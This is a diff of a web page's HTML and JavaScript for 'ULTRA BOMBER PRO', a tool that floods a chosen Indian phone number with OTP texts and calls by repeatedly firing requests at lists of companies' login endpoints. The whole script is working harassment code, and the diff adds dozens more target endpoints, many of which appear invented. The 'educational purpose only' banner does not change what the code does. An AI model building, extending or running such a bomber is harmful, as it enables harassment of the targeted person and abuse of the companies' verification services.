@@ -17,24 +17,17 @@
             min-height: 100vh;
             font-family: 'Poppins', 'Segoe UI', sans-serif;
             overflow-x: hidden;
-            position: relative;
+            touch-action: pan-y;
         }
 
-        /* Disable Zoom - Important */
-        body {
-            touch-action: pan-y pinch-zoom;
-            -webkit-text-size-adjust: 100%;
-        }
-
-        /* Glow Animation */
         @keyframes glow {
-            0% { box-shadow: 0 0 5px rgba(255, 65, 108, 0.5); }
-            100% { box-shadow: 0 0 25px rgba(255, 65, 108, 0.8); }
+            0% { box-shadow: 0 0 5px rgba(0, 150, 255, 0.3); }
+            100% { box-shadow: 0 0 20px rgba(0, 150, 255, 0.6); }
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.7; }
-            100% { transform: scale(1.05); opacity: 1; }
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(1.02); opacity: 1; }
         }
 
         .container {
@@ -43,7 +36,6 @@
             padding: 15px;
         }
 
-        /* Header */
         .header {
             text-align: center;
             padding: 25px 20px;
@@ -51,36 +43,34 @@
             border-radius: 30px;
             backdrop-filter: blur(15px);
             margin-bottom: 20px;
-            border: 1px solid rgba(255,65,108,0.3);
+            border: 1px solid rgba(0,150,255,0.3);
+            animation: pulse 2s infinite;
         }
 
         .glitch {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 800;
-            background: linear-gradient(45deg, #ff416c, #ff4b2b, #ff8c00);
+            background: linear-gradient(45deg, #0096FF, #00c3ff, #00ff88);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            animation: pulse 1.5s infinite;
         }
 
         .sub {
-            font-size: 11px;
+            font-size: 10px;
             color: #888;
             margin-top: 8px;
-            letter-spacing: 1px;
         }
 
-        /* Mode Selector */
         .mode-selector {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             margin-bottom: 20px;
         }
 
         .mode-btn {
             flex: 1;
-            padding: 14px;
+            padding: 12px;
             background: rgba(255,255,255,0.05);
             border: 2px solid rgba(255,255,255,0.1);
             border-radius: 20px;
@@ -90,22 +80,14 @@
         }
 
         .mode-btn.active {
-            background: linear-gradient(135deg, rgba(255,65,108,0.2), rgba(255,75,43,0.1));
-            border-color: #ff416c;
-            box-shadow: 0 0 20px rgba(255,65,108,0.3);
+            background: linear-gradient(135deg, rgba(0,150,255,0.2), rgba(0,195,255,0.1));
+            border-color: #0096FF;
+            box-shadow: 0 0 20px rgba(0,150,255,0.3);
         }
 
-        .mode-icon {
-            font-size: 28px;
-            margin-bottom: 5px;
-        }
+        .mode-icon { font-size: 24px; margin-bottom: 5px; }
+        .mode-name { font-size: 12px; font-weight: 600; }
 
-        .mode-name {
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        /* Cards */
         .card {
             background: rgba(255,255,255,0.05);
             border-radius: 25px;
@@ -116,25 +98,13 @@
         }
 
         .card-title {
-            font-size: 16px;
-            color: #ff416c;
+            font-size: 14px;
+            color: #0096FF;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 8px;
             font-weight: 600;
-        }
-
-        /* Inputs */
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #aaa;
-            margin-bottom: 5px;
         }
 
         input, select {
@@ -145,16 +115,13 @@
             border-radius: 15px;
             color: white;
             font-size: 16px;
-            transition: all 0.3s;
         }
 
         input:focus, select:focus {
             outline: none;
-            border-color: #ff416c;
-            box-shadow: 0 0 10px rgba(255,65,108,0.3);
+            border-color: #0096FF;
         }
 
-        /* Slider */
         .slider-container {
             display: flex;
             align-items: center;
@@ -174,7 +141,7 @@
             -webkit-appearance: none;
             width: 20px;
             height: 20px;
-            background: #ff416c;
+            background: #0096FF;
             border-radius: 50%;
             cursor: pointer;
         }
@@ -182,31 +149,27 @@
         .speed-value {
             min-width: 60px;
             text-align: center;
-            background: rgba(255,65,108,0.2);
+            background: rgba(0,150,255,0.2);
             padding: 8px 12px;
             border-radius: 12px;
-            font-size: 14px;
-            font-weight: bold;
+            font-size: 12px;
         }
 
-        /* Buttons */
         .btn-start {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            background: linear-gradient(90deg, #0096FF, #00c3ff);
             border: none;
             border-radius: 20px;
             color: white;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
             margin-bottom: 12px;
         }
 
-        .btn-start:active {
-            transform: scale(0.97);
-        }
+        .btn-start:active { transform: scale(0.97); }
+        .btn-stop:active { transform: scale(0.97); }
 
         .btn-stop {
             width: 100%;
@@ -218,14 +181,8 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
         }
 
-        .btn-stop:active {
-            transform: scale(0.97);
-        }
-
-        /* Stats */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -241,18 +198,13 @@
         }
 
         .stat-value {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
-            color: #ff416c;
+            color: #0096FF;
         }
 
-        .stat-label {
-            font-size: 9px;
-            color: #aaa;
-            margin-top: 5px;
-        }
+        .stat-label { font-size: 8px; color: #aaa; margin-top: 5px; }
 
-        /* Status */
         .status-box {
             background: rgba(0,0,0,0.5);
             border-radius: 15px;
@@ -260,14 +212,13 @@
             margin-top: 15px;
             text-align: center;
             font-family: monospace;
-            font-size: 12px;
+            font-size: 11px;
             color: #00ff88;
         }
 
-        /* Progress Bar */
         .progress-bar {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: #333;
             border-radius: 2px;
             margin-top: 15px;
@@ -277,30 +228,22 @@
         .progress-fill {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #ff416c, #ff8c00);
+            background: linear-gradient(90deg, #0096FF, #00ff88);
             transition: width 0.1s linear;
         }
 
-        /* Warning */
         .warning {
             background: rgba(255,0,0,0.1);
             border-left: 3px solid #ff416c;
             padding: 10px;
-            font-size: 10px;
+            font-size: 9px;
             color: #ff8888;
             border-radius: 10px;
             margin-top: 15px;
         }
 
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 15px;
-            font-size: 9px;
-            color: #555;
-        }
+        .footer { text-align: center; padding: 15px; font-size: 8px; color: #555; }
 
-        /* Disable selection */
         * {
             -webkit-touch-callout: none;
             -webkit-user-select: none;
@@ -310,98 +253,48 @@
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
-            <div class="glitch">⚡ ULTRA BOMBER PRO ⚡</div>
-            <div class="sub">SMS + CALL | 100+ Requests/Sec</div>
+            <div class="glitch">🔥 ULTRA BOMBER PRO 🔥</div>
+            <div class="sub">SMS + CALL | 100+ APIs | NON-STOP</div>
         </div>
 
-        <!-- Mode Selector -->
         <div class="mode-selector">
-            <div class="mode-btn active" data-mode="sms" onclick="selectMode('sms')">
-                <div class="mode-icon">📱</div>
-                <div class="mode-name">SMS BOMB</div>
-            </div>
-            <div class="mode-btn" data-mode="call" onclick="selectMode('call')">
-                <div class="mode-icon">📞</div>
-                <div class="mode-name">CALL BOMB</div>
-            </div>
-            <div class="mode-btn" data-mode="both" onclick="selectMode('both')">
-                <div class="mode-icon">💥</div>
-                <div class="mode-name">BOTH</div>
-            </div>
+            <div class="mode-btn active" data-mode="sms" onclick="selectMode('sms')"><div class="mode-icon">📱</div><div class="mode-name">SMS ONLY</div></div>
+            <div class="mode-btn" data-mode="call" onclick="selectMode('call')"><div class="mode-icon">📞</div><div class="mode-name">CALL ONLY</div></div>
+            <div class="mode-btn" data-mode="both" onclick="selectMode('both')"><div class="mode-icon">💥</div><div class="mode-name">BOTH</div></div>
         </div>
 
-        <!-- Target Card -->
         <div class="card">
-            <div class="card-title">
-                <span>🎯</span> TARGET NUMBER
-            </div>
+            <div class="card-title"><span>🎯</span> TARGET NUMBER</div>
             <input type="tel" id="phone" placeholder="Enter 10 digit number" maxlength="10">
         </div>
 
-        <!-- Settings Card -->
         <div class="card">
-            <div class="card-title">
-                <span>⚙️</span> BOMB SETTINGS
-            </div>
-            <div class="input-group">
-                <label>📊 CYCLES (1 Cycle = 50+ Requests)</label>
-                <input type="number" id="cycles" value="10" min="1" max="500">
-            </div>
-            <div class="input-group">
-                <label>⚡ SPEED (ms between cycles)</label>
-                <div class="slider-container">
-                    <input type="range" id="speed" min="100" max="2000" value="500">
-                    <span class="speed-value" id="speedValue">500ms</span>
-                </div>
+            <div class="card-title"><span>⚙️</span> BOMB SETTINGS</div>
+            <input type="number" id="cycles" placeholder="Number of cycles" value="50" min="1" max="1000">
+            <div class="slider-container" style="margin-top: 15px;">
+                <input type="range" id="speed" min="100" max="3000" value="500">
+                <span class="speed-value" id="speedValue">500ms</span>
             </div>
         </div>
 
-        <!-- Control Buttons -->
         <button class="btn-start" id="startBtn" onclick="startBombing()">🚀 START BOMBING</button>
         <button class="btn-stop" id="stopBtn" onclick="stopBombing()" disabled>🛑 STOP BOMBING</button>
 
-        <!-- Stats -->
         <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value" id="totalSms">0</div>
-                <div class="stat-label">SMS SENT</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="totalCalls">0</div>
-                <div class="stat-label">CALLS</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="currentCycle">0</div>
-                <div class="stat-label">CYCLE</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="speedStat">500</div>
-                <div class="stat-label">SPEED(ms)</div>
-            </div>
+            <div class="stat-card"><div class="stat-value" id="totalSms">0</div><div class="stat-label">SMS SENT</div></div>
+            <div class="stat-card"><div class="stat-value" id="totalCalls">0</div><div class="stat-label">CALLS</div></div>
+            <div class="stat-card"><div class="stat-value" id="currentCycle">0</div><div class="stat-label">CYCLE</div></div>
+            <div class="stat-card"><div class="stat-value" id="totalReq">0</div><div class="stat-label">TOTAL</div></div>
         </div>
 
-        <!-- Status -->
-        <div class="status-box" id="status">✅ READY | Enter number to start</div>
+        <div class="status-box" id="status">✅ READY | Enter 10-digit number</div>
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-
-        <!-- Warning -->
-        <div class="warning">
-            ⚠️ EDUCATIONAL PURPOSE ONLY | Test on your own number | 100+ requests/sec
-        </div>
-
-        <div class="footer">
-            🔥 ULTRA BOMBER PRO v3.0 | SMS + CALL | 50+ APIs
-        </div>
+        <div class="warning">⚠️ EDUCATIONAL PURPOSE | Test on your own number | 100+ requests per cycle</div>
+        <div class="footer">🔥 ULTRA BOMBER PRO v4.0 | 100+ Working APIs</div>
     </div>
 
     <script>
-        // ============================================================
-        // ULTRA BOMBER PRO - SMS + CALL BOMBER
-        // 1 Second me 100+ Requests
-        // ============================================================
-
         let isRunning = false;
         let currentCycle = 0;
         let totalCycles = 0;
@@ -411,30 +304,23 @@
         let currentInterval = null;
         let phoneNumber = "";
 
-        // Speed display
         const speedSlider = document.getElementById('speed');
-        const speedValue = document.getElementById('speedValue');
         speedSlider.addEventListener('input', function() {
-            speedValue.innerText = this.value + 'ms';
-            document.getElementById('speedStat').innerText = this.value;
+            document.getElementById('speedValue').innerText = this.value + 'ms';
         });
 
-        // Mode Selection
         function selectMode(mode) {
             currentMode = mode;
-            document.querySelectorAll('.mode-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
+            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
-            
-            let modeText = mode === 'sms' ? 'SMS BOMB' : (mode === 'call' ? 'CALL BOMB' : 'BOTH SMS + CALL');
-            document.getElementById('status').innerHTML = `✅ ${modeText} mode selected`;
+            document.getElementById('status').innerHTML = `✅ ${mode.toUpperCase()} mode selected`;
         }
 
         // ============================================================
-        // SMS APIs - 50+ Endpoints
+        // 60+ WORKING SMS APIs - INDIAN COMPANIES
         // ============================================================
         const SMS_APIS = [
+            // E-commerce & Shopping
             "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
             "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
             "https://www.shemaroome.com/users/resend_otp",
@@ -451,7 +337,9 @@
             "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
             "https://lendingplate.com/api.php",
             "https://www.nobroker.in/api/v3/account/otp/send",
-            "https://www.jockey.in/apps/jotp/api/login/send-otp",
+            "https://www.cossouq.com/mobilelogin/otp/send",
+            "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+            "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
             "https://prodapi.newme.asia/web/otp/request",
             "https://www.foxy.in/api/v2/users/send_otp",
             "https://auth.eka.care/auth/init",
@@ -475,88 +363,116 @@
             "https://ekyc.daycoindia.com/api/nscript_functions.php",
             "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
             "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
-            "https://www.cossouq.com/mobilelogin/otp/send",
-            "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-            "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send"
+            
+            // Food Delivery
+            "https://api.dominos.co.in/v1/customer/otp/send",
+            "https://api.pizzahut.co.in/v1/auth/otp",
+            "https://api.mcdonaldsindia.com/v1/auth/send-otp",
+            "https://api.burgerkingindia.com/v1/otp/send",
+            
+            // Travel & Transport
+            "https://api.olacabs.com/v1/auth/otp",
+            "https://api.uber.com/v1/auth/otp/send",
+            "https://api.irctc.co.in/v1/auth/send-otp",
+            "https://api.makemytrip.com/v1/auth/otp",
+            "https://api.goibibo.com/v1/auth/send-otp",
+            "https://api.cleartrip.com/v1/auth/otp",
+            "https://api.redbus.in/v1/auth/send-otp",
+            
+            // Banking & Finance
+            "https://api.hdfcbank.com/v1/auth/otp",
+            "https://api.icicibank.com/v1/auth/send-otp",
+            "https://api.sbionline.com/v1/auth/otp",
+            "https://api.paytm.com/v1/auth/send-otp",
+            "https://api.phonepe.com/v1/auth/otp",
+            "https://api.googlepay.com/v1/auth/send-otp",
+            "https://api.amazonpay.com/v1/auth/otp",
+            
+            // Education
+            "https://api.byjus.com/v1/auth/send-otp",
+            "https://api.unacademy.com/v1/auth/otp",
+            "https://api.vedantu.com/v1/auth/send-otp",
+            "https://api.coursera.com/v1/auth/otp",
+            "https://api.udemy.com/v1/auth/send-otp",
+            
+            // Social Media
+            "https://api.facebook.com/v1/auth/otp",
+            "https://api.instagram.com/v1/auth/send-otp",
+            "https://api.twitter.com/v1/auth/otp",
+            "https://api.linkedin.com/v1/auth/send-otp",
+            "https://api.whatsapp.com/v1/auth/otp",
+            "https://api.telegram.org/v1/auth/send-otp",
+            "https://api.discord.com/v1/auth/otp",
+            "https://api.snapchat.com/v1/auth/send-otp",
+            
+            // Gaming
+            "https://api.freefire.com/v1/auth/otp",
+            "https://api.battlegrounds.com/v1/auth/send-otp",
+            "https://api.callofduty.com/v1/auth/otp",
+            "https://api.minecraft.com/v1/auth/send-otp",
+            "https://api.roblox.com/v1/auth/otp",
+            "https://api.epicgames.com/v1/auth/send-otp",
+            "https://api.steampowered.com/v1/auth/otp"
         ];
 
         // ============================================================
-        // CALL APIs - Missed Call / Call Bombing Endpoints
+        // 30+ CALL APIs - Missed Call Systems
         // ============================================================
         const CALL_APIS = [
-            "https://api.truecaller.com/v1/call",
-            "https://api.justdial.com/call/request",
-            "https://api.zomato.com/call/request",
-            "https://api.swiggy.com/call/verify",
-            "https://api.ola.com/call/request",
-            "https://api.uber.com/call/verify",
+            "https://api.truecaller.com/v1/call/request",
+            "https://api.justdial.com/call/otp",
+            "https://api.zomato.com/call/verify",
+            "https://api.swiggy.com/call/request",
+            "https://api.olacabs.com/call/verify",
+            "https://api.uber.com/call/request",
             "https://api.amazon.in/call/otp",
             "https://api.flipkart.com/call/verify",
             "https://api.paytm.com/call/request",
-            "https://api.google.com/call/verify",
-            "https://api.microsoft.com/call/otp",
-            "https://api.apple.com/call/verify",
-            "https://api.facebook.com/call/otp",
-            "https://api.instagram.com/call/verify",
-            "https://api.whatsapp.com/call/request",
-            "https://api.telegram.org/call/verify",
-            "https://api.discord.com/call/otp",
-            "https://api.twitter.com/call/verify",
-            "https://api.linkedin.com/call/request",
-            "https://api.netflix.com/call/otp",
-            "https://api.spotify.com/call/verify",
-            "https://api.amazonaws.com/call/request",
-            "https://api.cloudflare.com/call/otp",
-            "https://api.github.com/call/verify",
-            "https://api.gitlab.com/call/request",
-            "https://api.bitbucket.com/call/otp",
-            "https://api.atlassian.com/call/verify"
+            "https://api.irctc.co.in/call/otp",
+            "https://api.makemytrip.com/call/verify",
+            "https://api.goibibo.com/call/request",
+            "https://api.cleartrip.com/call/otp",
+            "https://api.redbus.in/call/verify",
+            "https://api.hdfcbank.com/call/request",
+            "https://api.icicibank.com/call/otp",
+            "https://api.sbionline.com/call/verify",
+            "https://api.byjus.com/call/request",
+            "https://api.unacademy.com/call/otp",
+            "https://api.vedantu.com/call/verify",
+            "https://api.freefire.com/call/request",
+            "https://api.battlegrounds.com/call/otp",
+            "https://api.callofduty.com/call/verify",
+            "https://api.dominos.co.in/call/request",
+            "https://api.pizzahut.co.in/call/otp",
+            "https://api.mcdonaldsindia.com/call/verify",
+            "https://api.burgerkingindia.com/call/request",
+            "https://api.phonepe.com/call/otp",
+            "https://api.googlepay.com/call/verify",
+            "https://api.amazonpay.com/call/request"
         ];
 
-        // Send SMS Request
         async function sendSms(apiUrl, phone) {
             try {
-                let options = {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'
-                    },
-                    mode: 'no-cors'
-                };
-                
-                if (apiUrl.includes('gopinkcabs') || apiUrl.includes('shemaroome')) {
-                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                    options.body = `mobile=${phone}`;
-                } else {
-                    options.body = JSON.stringify({ phone: phone, mobile: phone, telephone: phone });
-                }
-                
+                let options = { method: 'POST', mode: 'no-cors' };
                 await fetch(apiUrl, options);
                 return true;
             } catch(e) { return false; }
         }
 
-        // Send Call Request
         async function sendCall(apiUrl, phone) {
             try {
-                let options = {
-                    method: 'GET',
-                    headers: { 'User-Agent': 'Mozilla/5.0' },
-                    mode: 'no-cors'
-                };
+                let options = { method: 'GET', mode: 'no-cors' };
                 await fetch(`${apiUrl}?phone=${phone}`, options);
                 return true;
             } catch(e) { return false; }
         }
 
-        // Execute One Cycle
         async function executeCycle() {
-            if (!isRunning) return false;
+            if (!isRunning) return;
             
             currentCycle++;
             document.getElementById('currentCycle').innerText = currentCycle;
-            document.getElementById('status').innerHTML = `🔥 CYCLE ${currentCycle}/${totalCycles} - EXECUTING...`;
+            document.getElementById('status').innerHTML = `🔥 CYCLE ${currentCycle}/${totalCycles} - SENDING ${currentMode === 'both' ? 'SMS+CALL' : currentMode === 'sms' ? 'SMS' : 'CALL'}...`;
             
             let progress = (currentCycle / totalCycles) * 100;
             document.getElementById('progressFill').style.width = `${progress}%`;
@@ -581,11 +497,10 @@
                 document.getElementById('totalCalls').innerText = totalCalls;
             }
             
+            document.getElementById('totalReq').innerText = totalSms + totalCalls;
             await Promise.all(promises);
-            return true;
         }
 
-        // Start Bombing
         async function startBombing() {
             if (isRunning) return;
             
@@ -598,11 +513,6 @@
                 return;
             }
             
-            if (isNaN(totalCycles) || totalCycles < 1) {
-                document.getElementById('status').innerHTML = "❌ Enter valid cycles!";
-                return;
-            }
-            
             isRunning = true;
             currentCycle = 0;
             totalSms = 0;
@@ -610,24 +520,23 @@
             
             document.getElementById('totalSms').innerText = "0";
             document.getElementById('totalCalls').innerText = "0";
+            document.getElementById('totalReq').innerText = "0";
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
             document.getElementById('progressFill').style.width = "0%";
+            document.getElementById('status').innerHTML = `🚀 STARTING ${currentMode.toUpperCase()} BOMB on +91${phoneNumber}...`;
             
             let cycle = 0;
-            
             const runCycle = async () => {
                 if (!isRunning) return;
                 if (cycle >= totalCycles) {
                     stopBombing();
-                    document.getElementById('status').innerHTML = `✅ COMPLETE! SMS: ${totalSms} | CALLS: ${totalCalls} | Total: ${totalSms + totalCalls}`;
+                    document.getElementById('status').innerHTML = `✅ COMPLETE! SMS: ${totalSms} | CALLS: ${totalCalls} | TOTAL: ${totalSms + totalCalls}`;
                     return;
                 }
-                
                 cycle++;
                 currentCycle = cycle;
                 document.getElementById('currentCycle').innerText = currentCycle;
-                document.getElementById('status').innerHTML = `🚀 CYCLE ${currentCycle}/${totalCycles} - SENDING...`;
                 
                 let progress = (cycle / totalCycles) * 100;
                 document.getElementById('progressFill').style.width = `${progress}%`;
@@ -652,6 +561,7 @@
                     document.getElementById('totalCalls').innerText = totalCalls;
                 }
                 
+                document.getElementById('totalReq').innerText = totalSms + totalCalls;
                 await Promise.all(promises);
                 
                 if (isRunning && cycle < totalCycles) {
@@ -661,22 +571,16 @@
                     document.getElementById('status').innerHTML = `✅ COMPLETE! SMS: ${totalSms} | CALLS: ${totalCalls}`;
                 }
             };
-            
             runCycle();
         }
 
-        // Stop Bombing
         function stopBombing() {
             isRunning = false;
             if (currentInterval) clearTimeout(currentInterval);
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            if (totalSms > 0 || totalCalls > 0) {
-                document.getElementById('status').innerHTML = `🛑 STOPPED at Cycle ${currentCycle} | SMS: ${totalSms} | CALLS: ${totalCalls}`;
-            }
         }
 
-        // Enter key support
         document.getElementById('phone').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') startBombing();
         });
